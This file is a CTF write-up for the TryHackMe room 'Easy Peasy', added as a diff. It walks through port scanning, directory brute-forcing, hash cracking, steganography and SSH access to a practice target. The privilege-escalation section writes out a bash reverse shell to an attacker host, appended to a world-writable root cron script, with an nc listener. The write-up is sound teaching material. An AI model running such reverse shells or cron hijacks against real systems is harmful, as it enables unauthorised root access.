@@ -1,0 +1,221 @@
+# Easy Peasy
+
+**Platform:** TryHackMe  
+**Room:** [Easy Peasy](https://tryhackme.com/room/easypeasy)  
+**Difficulty:** Easy  
+**Type:** ⚑ Challenge
+**Status:** ✅ Completed  
+---
+
+## Executive Summary
+
+Easy Peasy is a CTF-style challenge room — no task-by-task guidance, just a target and flags to find. That distinction matters on a portfolio: challenge rooms require independent enumeration and problem-solving rather than following instructions.
+
+The attack chain involves multi-port web enumeration, layered encoding and hash cracking, steganography, non-standard SSH port access, and a cron-based privilege escalation. No single step is complex, but chaining them together without hints is the actual skill being tested.
+
+**Key techniques practiced:**
+- Multi-service nmap enumeration
+- Web directory brute-forcing with Gobuster
+- Multi-layer hash identification and cracking (MD5, custom algorithm)
+- Steganography with steghide
+- SSH on non-standard ports
+- Cron job exploitation for privilege escalation
+
+**Verdict:** Good enumeration discipline exercise. The multi-port web setup and encoding layers are representative of how OSCP machines hide their attack surface.
+
+---
+
+## Environment
+
+| Field | Value |
+|-------|-------|
+| Target OS | Linux |
+| Open Ports | 80 (nginx), 6498 (SSH), 65524 (Apache) |
+| Goal | User flag + root flag |
+
+---
+
+## Enumeration
+
+### nmap — Full Port Scan
+
+A default nmap scan only covers the top 1000 ports. On OSCP machines and CTFs alike, services are frequently placed on non-standard ports to catch lazy scanners. Always run a full port scan.
+
+```bash
+nmap -sV -sC -p- --min-rate 5000 <target-ip>
+```
+
+```
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.16.1
+6498/tcp  open  ssh     OpenSSH 7.6p1
+65524/tcp open  http    Apache httpd 2.4.43
+```
+
+Three services. Two web servers on non-standard ports. Both need to be enumerated independently.
+
+---
+
+## Web Enumeration — Port 80 (nginx)
+
+```bash
+# Initial visit — nginx default page, nothing obvious
+curl http://<target-ip>/
+
+# Directory brute-force
+gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Findings
+/hidden (301)
+```
+
+```bash
+# Enumerate the subdirectory
+gobuster dir -u http://<target-ip>/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Findings
+/whatever (301)
+```
+
+```bash
+# Page source of /hidden/whatever/ contains a base64 encoded string
+curl http://<target-ip>/hidden/whatever/
+# Source: <p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
+
+echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
+# flag{f1rs7_fl4g}
+```
+
+**Lesson:** Always check page source. Hidden HTML elements (`hidden` attribute, HTML comments, inline base64) are a common CTF and real-world OSCP technique for obscuring data.
+
+---
+
+## Web Enumeration — Port 65524 (Apache)
+
+```bash
+# Check robots.txt first — always
+curl http://<target-ip>:65524/robots.txt
+
+# Contains a hash
+User-Agent:*
+Disallow:/
+a18672860d0510e5ab6699730763b250
+```
+
+```bash
+# Identify hash type — MD5 (length 32, hex)
+# Crack it
+echo "a18672860d0510e5ab6699730763b250" > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
+# Result: googlearehistory
+```
+
+```bash
+# Apache default page source contains additional encoded data
+curl http://<target-ip>:65524/
+# Source inspection reveals:
+# - A flag encoded in base62
+# - A hidden hash tied to a non-standard algorithm (easypeasy hash)
+```
+
+The easypeasy hash is not in standard John/Hashcat wordlists without the correct ruleset. The hash type is identified via hash-identifier or online tools, and the relevant wordlist (easypeasy.txt) is referenced in the room:
+
+```bash
+john --wordlist=easypeasy.txt --format=easypeasy hash.txt
+# Result: mypasswordforthatjob
+```
+
+---
+
+## Steganography
+
+The web content includes a reference to an image file. Downloaded images should always be checked for hidden data when other avenues are exhausted.
+
+```bash
+# Download the image
+wget http://<target-ip>:65524/<image-path>/binarycodepixabay.jpg
+
+# Attempt steghide extraction (no passphrase or use cracked password)
+steghide extract -sf binarycodepixabay.jpg -p "mypasswordforthatjob"
+
+# Extracted file contains SSH credentials
+cat secrettext.txt
+# username: boring
+# password: <binary encoded string>
+```
+
+```bash
+# Decode binary to ASCII
+echo "01101001 01100011 ..." | python3 -c "
+import sys
+binary = sys.stdin.read().strip().split()
+print(''.join([chr(int(b, 2)) for b in binary]))
+"
+# Result: SSH password
+```
+
+---
+
+## Initial Access — SSH
+
+```bash
+# SSH on the non-standard port discovered during enumeration
+ssh boring@<target-ip> -p 6498
+
+# User flag is in home directory (ROT13 encoded)
+cat user.txt
+# Decode ROT13
+cat user.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+---
+
+## Privilege Escalation — Cron Job Hijacking
+
+```bash
+# Check system crontab
+cat /etc/crontab
+
+# Interesting entry — script running as root
+* * * * * root /var/www/.mysecretcronjob.sh
+
+# Check permissions
+ls -la /var/www/.mysecretcronjob.sh
+# -rwxrwxrwx — world-writable
+
+# Inject a reverse shell
+echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /var/www/.mysecretcronjob.sh
+
+# Start listener on attacker
+nc -nlvp 4444
+
+# Wait for cron execution (up to 1 minute)
+whoami
+# root
+```
+
+The cron job runs every minute as root, and the script is world-writable — a classic misconfiguration. Appending a reverse shell to the script is cleaner than overwriting it, as it preserves whatever the original script does (reducing detection noise on real engagements).
+
+---
+
+## Key Takeaways
+
+**Always full port scan.** Two of the three services in this room are on ports above 1000. A default nmap scan misses them entirely.
+
+**Check robots.txt and page source immediately.** These are the first two manual checks after landing on any web service — before running any tools.
+
+**Steganography is situational but real.** On the OSCP exam it's rare, but in CTF-style rooms it appears regularly. `steghide`, `binwalk`, and `exiftool` cover the majority of cases.
+
+**Cron writeability is a high-value find.** When you see a cron job running as root, immediately check if the script is writable or if the directory it resides in is writable (directory writability allows dropping a new file with the same name).
+
+```bash
+# Key commands for this room type
+nmap -p- --min-rate 5000 <ip>                          # Full port scan
+gobuster dir -u <url> -w <wordlist>                    # Directory brute-force
+hash-identifier <hash>                                  # Identify hash type
+steghide extract -sf <image> -p <password>             # Extract hidden data
+cat /etc/crontab                                        # Always check cron
+ls -la <cron-script>                                   # Check script permissions
+```
+
+---
